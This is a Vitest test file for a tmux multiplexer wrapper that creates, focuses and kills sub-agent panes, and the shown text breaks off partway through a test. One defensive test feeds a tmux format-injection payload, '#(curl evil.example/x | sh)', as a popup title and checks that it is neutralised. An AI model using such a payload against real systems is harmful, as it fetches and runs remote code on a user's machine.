import { EventEmitter } from "node:events";
import { afterEach, describe, expect, it, vi } from "vitest";
import { importFresh } from "./test-utils";

/** Standard tmux pane id returned by mocks when creating a new pane. */
const MOCK_PANE_ID = "%42";
/**
 * Tab-separated session/window/pane output matching real
 * `display-message -p -t <id> "#{session_name}\t#{window_index}\t#{pane_index}"`.
 */
const MOCK_LOCATION = "main\t1\t0\n";

function installMockExec(scenario: (args: string[]) => string) {
  vi.resetModules();
  vi.doMock("node:child_process", () => ({
    execFileSync: (_file: string, args: string[]) => scenario(args as string[]),
  }));
}

/**
 * True for the `commandExists` availability probe.
 *
 * Pins the argv shape: `/bin/sh -c "command -v 'tmux'"`. Notably `-c`, NOT
 * `-lc` — the probe must not source the user's login profile on every call.
 * Matching the `command -v` payload rather than a bare `-c` matters because
 * tmux's own argv uses `-c <cwd>` for the working directory.
 */
function isCommandProbe(args: readonly string[]): boolean {
  return args[0] === "-c" && (args[1] ?? "").startsWith("command -v");
}

describe("multiplexer-tmux", () => {
  afterEach(() => {
    vi.doUnmock("node:child_process");
    delete process.env.TMUX;
    delete process.env.TMUX_PANE;
  });

  /* ------------------------------------------------------------------ */
  /*  isAvailable                                                        */
  /* ------------------------------------------------------------------ */

  it("isAvailable returns true when tmux binary exists and TMUX env var is set", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    installMockExec((args) => {
      // /bin/sh -c "command -v 'tmux'" succeeds
      if (isCommandProbe(args)) return "";
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(new TmuxMultiplexer().isAvailable()).toBe(true);
  });

  it("isAvailable is binary-only: returns true even when TMUX env var is unset", async () => {
    // Symmetric with ZellijMultiplexer: isAvailable must NOT require TMUX.
    installMockExec((args) => {
      if (isCommandProbe(args)) return "";
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(new TmuxMultiplexer().isAvailable()).toBe(true);
  });

  it("isAvailable returns false when tmux binary is not on PATH", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    installMockExec((args) => {
      if (isCommandProbe(args)) throw new Error("command not found");
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(new TmuxMultiplexer().isAvailable()).toBe(false);
  });

  /* ------------------------------------------------------------------ */
  /*  createPane — background mode (new-window)                          */
  /* ------------------------------------------------------------------ */

  it("createPane background mode uses new-window -d -n and returns % prefixed paneId + windowName", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    process.env.TMUX_PANE = "%1";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (args[0] === "new-window") return `${MOCK_PANE_ID}\n`;
      if (args[0] === "display-message") return MOCK_LOCATION;
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const result = new TmuxMultiplexer().createPane({
      name: "Demo",
      cwd: "/tmp",
      background: true,
    });

    expect(result.paneId).toBe(MOCK_PANE_ID);
    expect(result.windowName).toBe("demo");
    expect(result.session).toBe("main");

    const nw = calls.find((a) => a[0] === "new-window");
    expect(nw).toBeDefined();
    // -d = detached; -n = name; -P -F #{pane_id} = print pane id
    expect(nw).toContain("-d");
    expect(nw).toContain("-n");
    expect(nw).toContain("demo");
    expect(nw).toContain("-P");
    expect(nw).toContain("-F");
    expect(nw).toContain("#{pane_id}");
    // Working directory
    expect(nw).toContain("-c");
    expect(nw).toContain("/tmp");
  });

  it("createPane background mode uses explicit windowName when provided", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    process.env.TMUX_PANE = "%1";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (args[0] === "new-window") return "%99\n";
      if (args[0] === "display-message") return MOCK_LOCATION;
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const result = new TmuxMultiplexer().createPane({
      name: "Demo",
      cwd: "/tmp",
      background: true,
      windowName: "my-custom-name",
    });

    expect(result.paneId).toBe("%99");
    expect(result.windowName).toBe("my-custom-name");
    expect(result.session).toBe("main");

    const nw = calls.find((a) => a[0] === "new-window");
    expect(nw).toContain("my-custom-name");
  });

  it("createPane throws when tmux returns a non-% pane id (unexpected format)", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    process.env.TMUX_PANE = "%1";
    installMockExec((args) => {
      if (args[0] === "new-window") return "42\n"; // missing % prefix
      if (isCommandProbe(args)) return ""; // commandExists
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(() =>
      new TmuxMultiplexer().createPane({
        name: "Demo",
        cwd: "/tmp",
        background: true,
      }),
    ).toThrow(/Unexpected tmux pane id/);
  });

  /* ------------------------------------------------------------------ */
  /*  createPane — visible split mode (split-window)                     */
  /* ------------------------------------------------------------------ */

  it("createPane visible split mode uses split-window -h -d and returns paneId with parentPane", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    process.env.TMUX_PANE = "%1";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (args[0] === "split-window") return `${MOCK_PANE_ID}\n`;
      if (args[0] === "display-message") return MOCK_LOCATION;
      if (args[0] === "select-pane") return "";
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const result = new TmuxMultiplexer().createPane({
      name: "Demo",
      cwd: "/tmp",
      background: false,
      parentPane: "%5",
    });

    expect(result.paneId).toBe(MOCK_PANE_ID);
    // Visible split has no windowName (same window as parent)
    expect(result.windowName).toBeUndefined();
    expect(result.session).toBe("main");

    const sw = calls.find((a) => a[0] === "split-window");
    expect(sw).toBeDefined();
    expect(sw).toContain("-h");
    expect(sw).toContain("-d");
    expect(sw).toContain("-P");
    expect(sw).toContain("-F");
    expect(sw).toContain("#{pane_id}");
    expect(sw).toContain("-c");
    expect(sw).toContain("/tmp");
    // -t targets the parent pane
    expect(sw).toContain("-t");
    expect(sw).toContain("%5");

    // Cosmetic: sets pane title
    const sp = calls.find((a) => a[0] === "select-pane");
    expect(sp).toBeDefined();
    expect(sp).toContain("-T");
    expect(sp).toContain("Demo");
  });

  it("createPane visible split falls back to TMUX_PANE when parentPane is omitted", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    process.env.TMUX_PANE = "%9";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (args[0] === "split-window") return "%88\n";
      if (args[0] === "display-message") return MOCK_LOCATION;
      if (args[0] === "select-pane") return "";
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    new TmuxMultiplexer().createPane({
      name: "T",
      cwd: "/tmp",
      background: false,
      // parentPane omitted — should use TMUX_PANE
    });

    const sw = calls.find((a) => a[0] === "split-window");
    expect(sw).toContain("-t");
    expect(sw).toContain("%9");
  });

  it("cleans up a created pane when its session cannot be derived", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (isCommandProbe(args)) return "";
      if (args[0] === "new-window") return "%42\n";
      if (args[0] === "display-message") throw new Error("server disappeared");
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    expect(() =>
      new TmuxMultiplexer().createPane({
        name: "Demo",
        cwd: "/tmp",
        background: true,
      }),
    ).toThrow(/Failed to determine session/);
    expect(calls).toContainEqual(["kill-pane", "-t", "%42"]);
  });

  it("targets the created session when probing attached clients", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const asyncCalls: string[][] = [];
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFileSync: (_file: string, args: string[]) => {
        if (isCommandProbe(args)) return "";
        if (args[0] === "new-window") return "%42\n";
        if (args[0] === "display-message") return "target-session\t1\t0\n";
        return "";
      },
      execFile: (
        _file: string,
        args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => {
        asyncCalls.push(args);
        if (args[0] === "list-sessions") {
          callback(null, "target-session\nunrelated-session\n");
          return;
        }
        const targetIndex = args.indexOf("-t");
        const target = targetIndex === -1 ? undefined : args[targetIndex + 1];
        callback(null, target === "target-session" ? "" : "unrelated-client\n");
      },
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const mux = new TmuxMultiplexer();
    const created = mux.createPane({
      name: "Demo",
      cwd: "/tmp",
      background: true,
    });

    expect(created.session).toBe("target-session");
    await expect(mux.hasAttachedClientAsync(created.session)).resolves.toBe(
      false,
    );
    expect(asyncCalls).toContainEqual([
      "list-clients",
      "-t",
      "target-session",
      "-F",
      "#{client_name}",
    ]);
  });

  it("returns false from successful evidence that a target session is absent", async () => {
    const calls: string[][] = [];
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFile: (
        _file: string,
        args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => {
        calls.push(args);
        callback(null, "other-session\n");
      },
      execFileSync: () => "",
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    await expect(
      new TmuxMultiplexer().hasAttachedClientAsync("missing-session"),
    ).resolves.toBe(false);
    expect(calls).toEqual([["list-sessions", "-F", "#{session_name}"]]);
  });

  it("returns undefined when the session listing fails", async () => {
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFile: (
        _file: string,
        _args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => callback(new Error("server unavailable"), ""),
      execFileSync: () => "",
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    await expect(
      new TmuxMultiplexer().hasAttachedClientAsync("target-session"),
    ).resolves.toBeUndefined();
  });

  it("returns undefined when client listing fails for a valid session", async () => {
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFile: (
        _file: string,
        args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => {
        if (args[0] === "list-sessions") {
          callback(null, "target-session\n");
          return;
        }
        callback(new Error("client probe timed out"), "");
      },
      execFileSync: () => "",
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    await expect(
      new TmuxMultiplexer().hasAttachedClientAsync("target-session"),
    ).resolves.toBeUndefined();
  });

  /* ------------------------------------------------------------------ */
  /*  createPane — relaxed path (parent not in tmux)                     */
  /* ------------------------------------------------------------------ */

  it("createPane relaxed path creates a new detached session when TMUX is unset", async () => {
    delete process.env.TMUX;
    delete process.env.TMUX_PANE;
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (args[0] === "new-session") return `${MOCK_PANE_ID}\n`;
      if (args[0] === "rename-window") return "";
      if (isCommandProbe(args)) return ""; // commandExists
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const result = new TmuxMultiplexer().createPane({
      name: "Demo",
      cwd: "/tmp",
      background: true,
      id: "abc12345",
    });

    expect(result.paneId).toBe(MOCK_PANE_ID);
    // Relaxed path always defines windowName (renamed from default "0")
    expect(result.windowName).toBe("demo");
    expect(result.session).toBe("pi-subagent-abc12345");

    const ns = calls.find((a) => a[0] === "new-session");
    expect(ns).toBeDefined();
    expect(ns).toContain("-d");
    expect(ns).toContain("-s");
    expect(ns).toContain("pi-subagent-abc12345");
    expect(ns).toContain("-c");
    expect(ns).toContain("/tmp");
    expect(ns).toContain("-P");
    expect(ns).toContain("-F");
    expect(ns).toContain("#{pane_id}");

    const rn = calls.find((a) => a[0] === "rename-window");
    expect(rn).toBeDefined();
    expect(rn).toContain("pi-subagent-abc12345:0");
    expect(rn).toContain("demo");
  });

  it("reuses the detached session and opens later subagents as windows", async () => {
    delete process.env.TMUX;
    delete process.env.TMUX_PANE;
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (args[0] === "new-session") return "%42\n";
      if (args[0] === "new-window") return "%43\n";
      if (args[0] === "display-message") {
        return "pi-subagent-abc12345\t1\t0\n";
      }
      if (isCommandProbe(args)) return ""; // commandExists
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const mux = new TmuxMultiplexer();
    const first = mux.createPane({
      name: "First",
      cwd: "/tmp",
      background: true,
      id: "abc12345",
    });
    const second = mux.createPane({
      name: "Second",
      cwd: "/tmp",
      background: true,
      id: "def67890",
    });

    expect(first.windowName).toBe("first");
    expect(second.windowName).toBe("second");
    expect(first.session).toBe("pi-subagent-abc12345");
    expect(second.session).toBe("pi-subagent-abc12345");
    expect(calls.filter((args) => args[0] === "new-session")).toHaveLength(1);
    const newWindow = calls.find((args) => args[0] === "new-window");
    expect(newWindow).toBeDefined();
    expect(newWindow).toContain("-t");
    expect(newWindow).toContain("pi-subagent-abc12345");
    expect(newWindow).toContain("second");
    const commands = mux.buildAttachCommands({
      paneId: second.paneId,
      windowName: second.windowName,
    });
    expect(commands.attachCommand).toContain(
      "tmux attach -t 'pi-subagent-abc12345'",
    );
    // Window targets carry the session returned by display-message, so the
    // second agent's window cannot be confused with an identically-named window
    // in another session.
    expect(commands.attachCommand).toContain(
      "select-window -t 'pi-subagent-abc12345:second'",
    );
    expect(commands.focusCommand).toBe(
      "tmux select-window -t 'pi-subagent-abc12345:second'",
    );
  });

  it("createPane relaxed path validates pane id starts with %", async () => {
    delete process.env.TMUX;
    delete process.env.TMUX_PANE;
    installMockExec((args) => {
      if (args[0] === "new-session") return "XX\n"; // bad format
      if (isCommandProbe(args)) return "";
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(() =>
      new TmuxMultiplexer().createPane({
        name: "Demo",
        cwd: "/tmp",
        background: true,
        id: "abc12345",
      }),
    ).toThrow(/Unexpected tmux pane id/);
  });

  it("createPane relaxed path throws when tmux binary is not available", async () => {
    delete process.env.TMUX;
    installMockExec((args) => {
      if (isCommandProbe(args)) throw new Error("command not found");
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(() =>
      new TmuxMultiplexer().createPane({
        name: "Demo",
        cwd: "/tmp",
        background: true,
        id: "abc12345",
      }),
    ).toThrow(/tmux is not available/);
  });

  /* ------------------------------------------------------------------ */
  /*  getPaneLiveness                                                   */
  /* ------------------------------------------------------------------ */

  it("returns alive when a successful pane listing contains the pane", async () => {
    installMockExec((args) => {
      if (args[0] === "list-panes") return "%1\n%42\n";
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(new TmuxMultiplexer().getPaneLiveness("%42")).toBe("alive");
  });

  it("returns dead when a successful pane listing omits the pane", async () => {
    installMockExec((args) => {
      if (args[0] === "list-panes") return "%1\n%2\n";
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(new TmuxMultiplexer().getPaneLiveness("%99")).toBe("dead");
  });

  it("returns unknown when sync or async pane listing fails", async () => {
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFileSync: () => {
        throw new Error("server unavailable");
      },
      execFile: (
        _file: string,
        _args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => callback(new Error("server unavailable"), ""),
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const mux = new TmuxMultiplexer();
    expect(mux.getPaneLiveness("%99")).toBe("unknown");
    await expect(mux.getPaneLivenessAsync("%99")).resolves.toBe("unknown");
  });

  it("returns unknown for malformed pane-listing output", async () => {
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFileSync: () => "not-a-pane\n",
      execFile: (
        _file: string,
        _args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => callback(null, "not-a-pane\n"),
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const mux = new TmuxMultiplexer();
    expect(mux.getPaneLiveness("%42")).toBe("unknown");
    await expect(mux.getPaneLivenessAsync("%42")).resolves.toBe("unknown");
  });

  it("getPaneLivenessAsync lists panes without using execFileSync", async () => {
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFileSync: () => {
        throw new Error("sync liveness probe must not run");
      },
      execFile: (
        _file: string,
        _args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => callback(null, "%1\n%42\n"),
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    await expect(
      new TmuxMultiplexer().getPaneLivenessAsync("%42"),
    ).resolves.toBe("alive");
  });

  it("coalesces concurrent async pane liveness probes", async () => {
    vi.resetModules();
    const execFile = vi.fn(
      (
        _file: string,
        _args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => setTimeout(() => callback(null, "%1\n%2\n"), 0),
    );
    vi.doMock("node:child_process", () => ({
      execFileSync: vi.fn(),
      execFile,
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const mux = new TmuxMultiplexer();

    await expect(
      Promise.all([
        mux.getPaneLivenessAsync("%1"),
        mux.getPaneLivenessAsync("%2"),
        mux.getPaneLivenessAsync("%3"),
      ]),
    ).resolves.toEqual(["alive", "alive", "dead"]);
    await expect(mux.getPaneLivenessAsync("%1")).resolves.toBe("alive");
    expect(execFile).toHaveBeenCalledTimes(1);
  });

  it("treats a successful blank listing as dead", async () => {
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFileSync: () => "\n",
      execFile: (
        _file: string,
        _args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => callback(null, "\n"),
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const mux = new TmuxMultiplexer();

    expect(mux.getPaneLiveness("%99")).toBe("dead");
    await expect(mux.getPaneLivenessAsync("%99")).resolves.toBe("dead");
  });

  it("lists all panes with stable pane-id output", async () => {
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (args[0] === "list-panes") return "%42\n";
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    new TmuxMultiplexer().getPaneLiveness("%42");

    expect(calls.find((args) => args[0] === "list-panes")).toEqual([
      "list-panes",
      "-a",
      "-F",
      "#{pane_id}",
    ]);
  });

  /* ------------------------------------------------------------------ */
  /*  sendKeys + sendEnter                                               */
  /* ------------------------------------------------------------------ */

  it("sendKeys calls send-keys -l with the text", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    new TmuxMultiplexer().sendKeys("%42", "echo hello");

    const sk = calls.find((a) => a[0] === "send-keys");
    expect(sk).toEqual(["send-keys", "-t", "%42", "-l", "--", "echo hello"]);
  });

  it("sendKeys terminates flags with -- so leading-dash text is not parsed as a flag", async () => {
    // Real tmux: `send-keys -t %42 -l "-n hi"` fails with
    // `command send-keys: unknown flag -n` (exit 1). Follow-up text is
    // user/model controlled, so the terminator must always be present.
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    new TmuxMultiplexer().sendKeys("%42", "-n not-a-flag");

    const sk = calls.find((a) => a[0] === "send-keys")!;
    expect(sk[sk.indexOf("-n not-a-flag") - 1]).toBe("--");
  });

  it("sendKeys sends text with newlines verbatim", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    new TmuxMultiplexer().sendKeys("%42", "line1\nline2");

    const sk = calls.find((a) => a[0] === "send-keys");
    expect(sk).toBeDefined();
    expect(sk).toContain("line1\nline2");
  });

  it("sendEnter calls send-keys with Enter key name", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    new TmuxMultiplexer().sendEnter("%42");

    const sk = calls.find((a) => a[0] === "send-keys");
    expect(sk).toBeDefined();
    expect(sk).toContain("-t");
    expect(sk).toContain("%42");
    // zellij sends "13" (byte value); tmux uses the named key "Enter"
    expect(sk).toContain("Enter");
  });

  /* ------------------------------------------------------------------ */
  /*  killPane                                                           */
  /* ------------------------------------------------------------------ */

  it("killPane calls kill-pane -t with the pane id", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    new TmuxMultiplexer().killPane("%42");

    const kp = calls.find((a) => a[0] === "kill-pane");
    expect(kp).toBeDefined();
    expect(kp).toContain("-t");
    expect(kp).toContain("%42");
  });

  it("killPane does not throw on error (best-effort)", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    installMockExec(() => {
      throw new Error("no such pane");
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(() => new TmuxMultiplexer().killPane("%99")).not.toThrow();
  });

  /* ------------------------------------------------------------------ */
  /*  buildAttachCommands — with windowName (background mode)            */
  /* ------------------------------------------------------------------ */

  it("buildAttachCommands with windowName returns session+select-window commands via getPaneLocation", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (args[0] === "display-message") return MOCK_LOCATION;
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const cmds = new TmuxMultiplexer().buildAttachCommands({
      paneId: "%42",
      windowName: "demo",
    });

    // getPaneLocation was called (display-message)
    expect(calls.some((a) => a[0] === "display-message")).toBe(true);

    expect(cmds.attachCommand).toContain("tmux attach -t 'main'");
    // \; is the tmux command separator for chaining
    expect(cmds.attachCommand).toContain("\\;");
    // Session-qualified window target — `-t 'demo'` alone is ambiguous across
    // sessions and silently selects the wrong one (see the real-binary guard in
    // tests/tmux.integration.test.ts).
    expect(cmds.attachCommand).toContain("select-window -t 'main:demo'");

    expect(cmds.focusCommand).toBe("tmux select-window -t 'main:demo'");
  });

  /* ------------------------------------------------------------------ */
  /*  buildAttachCommands — without windowName (split mode)              */
  /* ------------------------------------------------------------------ */

  it("buildAttachCommands without windowName returns chain targeting session:window + select-pane", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (args[0] === "display-message") return MOCK_LOCATION;
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    const cmds = new TmuxMultiplexer().buildAttachCommands({
      paneId: "%42",
    });

    expect(cmds.attachCommand).toBe(
      "tmux attach -t 'main' \\; select-window -t 'main:1' \\; select-pane -t '%42'",
    );
    expect(cmds.focusCommand).toBe("tmux select-pane -t '%42'");
  });

  it("buildAttachCommands getPaneLocation consumes the tab-separated display-message output", async () => {
    // Contract: display-message with #{session_name}\t#{window_index}\t#{pane_index}
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      // Output format: session_name\twindow_index\tpane_index (tab-separated)
      if (args[0] === "display-message") return "my-session\t3\t2\n";
      return "";
    });
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    const cmds = new TmuxMultiplexer().buildAttachCommands({
      paneId: "%42",
    });

    // session=my-session, window=3, pane=2
    expect(cmds.attachCommand).toContain("'my-session'");
    expect(cmds.attachCommand).toContain("'my-session:3'");
    expect(cmds.attachCommand).toContain("'%42'");

    // The display-message format template must include all three fields
    // (they're tab-separated into one arg element, so check substring).
    const fm = calls.find((a) => a[0] === "display-message");
    expect(fm).toBeDefined();
    const formatArg = fm!.find((s) => s.includes("#{session_name}"));
    expect(formatArg).toBeDefined();
    expect(formatArg!).toContain("#{window_index}");
    expect(formatArg!).toContain("#{pane_index}");
  });

  /* ------------------------------------------------------------------ */
  /*  structured focus + bounded capture                                 */
  /* ------------------------------------------------------------------ */

  it("exposes structured focus and bounded capture capabilities", async () => {
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(new TmuxMultiplexer().capabilities).toEqual({
      structuredFocus: true,
      boundedCapture: true,
      nativeOverlay: true,
    });
  });

  /**
   * `showNativeViewer` spawns a detached, ignored-stdio child and resolves once
   * it survives the startup grace window. Backend rejection is modeled as an
   * early child exit.
   */
  function installAsyncViewerMock(
    onCall: (args: string[]) => Error | null,
    calls: string[][],
  ): void {
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      spawn: (_file: string, args: string[]) => {
        calls.push(args);
        const child = new EventEmitter();
        Object.assign(child, { unref: vi.fn() });
        queueMicrotask(() => {
          if (onCall(args)) child.emit("exit", 1, null);
        });
        return child;
      },
      execFileSync: () => {
        throw new Error("showNativeViewer must not block the event loop");
      },
    }));
  }

  it("opens a transient native popup only when attached to tmux", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installAsyncViewerMock(() => null, calls);
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    await expect(
      new TmuxMultiplexer().showNativeViewer("Agent", "bounded output"),
    ).resolves.toBe(true);
    expect(calls[0]).toContain("display-popup");
    expect(calls[0]).toContain("Agent");
  });

  it("declines native popup presentation outside tmux", async () => {
    delete process.env.TMUX;
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    await expect(
      new TmuxMultiplexer().showNativeViewer("Agent", "output"),
    ).resolves.toBe(false);
  });

  it("reports failure when tmux rejects the popup (e.g. no current client)", async () => {
    // Real tmux exits 1 with `no current client` when the target session has
    // no attached client. A genuine spawn failure must still resolve false.
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installAsyncViewerMock(() => new Error("no current client"), calls);
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    await expect(
      new TmuxMultiplexer().showNativeViewer("Agent", "output"),
    ).resolves.toBe(false);
  });

  it("neutralizes a tmux format-injection payload in the native popup title", async () => {
    // A popup title is a tmux FORMAT, not a string: `#(cmd)` spawns a shell
    // job. Verified against tmux 3.7b — `display-popup -T '#(touch /tmp/pwn)'`
    // creates the file. The sub-agent name reaching this argument is
    // attacker-reachable (unvalidated schema field defaulted from task text),
    // so the `#` introducer must be gone before tmux ever sees it.
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installAsyncViewerMock(() => null, calls);
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    await expect(
      new TmuxMultiplexer().showNativeViewer(
        "#(curl evil.example/x | sh)\r\nrogue",
        "output",
      ),
    ).resolves.toBe(true);

    const popup = calls[0]!;
    const title = popup[popup.indexOf("-T") + 1]!;
    expect(title).not.toContain("#");
    expect(title).not.toContain("\r");
    expect(title).not.toContain("\n");
    expect(title).toBe("(curl evil.example/x | sh) rogue");
  });

  /**
   * `focusPane` targets the pane id for BOTH shapes. Pane ids are
   * tmux-server-global, so one target resolves pane + window + session. The
   * previous `select-window -t <windowName>` dropped `ref.session` entirely:
   * with `reviewer` windows in two sessions, real tmux returned exit 0 and
   * switched the OTHER session — silently focusing the wrong agent.
   */
  it("focusPane selects a background window by server-global pane id, not by window name", async () => {
    const calls: string[][] = [];
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFile: (
        _file: string,
        args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => {
        calls.push(args);
        callback(null, "");
      },
      execFileSync: () => {
        throw new Error("focusPane must not call display-message");
      },
    }));
